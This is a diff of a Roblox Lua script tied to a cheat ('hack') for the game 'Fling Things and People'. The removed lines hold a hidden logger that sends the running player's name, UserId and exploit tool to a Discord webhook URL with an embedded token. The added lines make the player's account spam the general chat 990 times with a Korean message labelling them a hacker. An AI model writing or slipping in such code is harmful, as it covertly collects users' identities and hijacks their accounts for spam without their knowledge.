@@ -1,41 +1,18 @@
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
+local TextChatService = game:GetService("TextChatService")
 
--- 현재 가장 잘 되는 Proxy
-local WEBHOOK_URL = "https://webhook.lewisakura.moe/1491747688415498393/wXHLss9QvcYHhFj60W-g6aLQ8lHkLkQ3yAzXJzI337MCFnQpQR5q9v31WGB9pBS4LGQQ"
+local message = "저는 이 핵을 실행한 핵쟁이 입니다"
 
-local function sendLog()
-    local executor = "Unknown"
-    if syn then executor = "Synapse X"
-    elseif fluxus then executor = "Fluxus"
-    elseif Delta then executor = "Delta Executor"
-    elseif getexecutorname then executor = getexecutorname()
-    elseif identifyexecutor then executor = identifyexecutor() end
+task.spawn(function()
+    for i = 1, 990 do  
+        pcall(function()
+            if TextChatService.TextChannels.RBXGeneral then
+                TextChatService.TextChannels.RBXGeneral:SendAsync(message)
+            end
+        end)
+        task.wait(0.15)  
+    end
+end)
 
-    local data = {
-        username = "NP Script Logger",
-        embeds = {{
-            title = "NP FTAP Script Executed",
-            color = 16711680,
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-            fields = {
-                {name = "DisplayName", value = plr.DisplayName or "Unknown", inline = true},
-                {name = "Username", value = "`" .. (plr.Name or "Unknown") .. "`", inline = true},
-                {name = "UserId", value = tostring(plr.UserId), inline = true},
-                {name = "Executor", value = executor, inline = true},
-                {name = "Game", value = "Fling Things and People", inline = true},
-                {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false}
-            }
-        }}
-    }
-
-    pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
-    end)
-end
-
-task.spawn(sendLog)
-
-task.wait(1)
-print("Loaded.")
+print("채팅 스팸 시작됨")
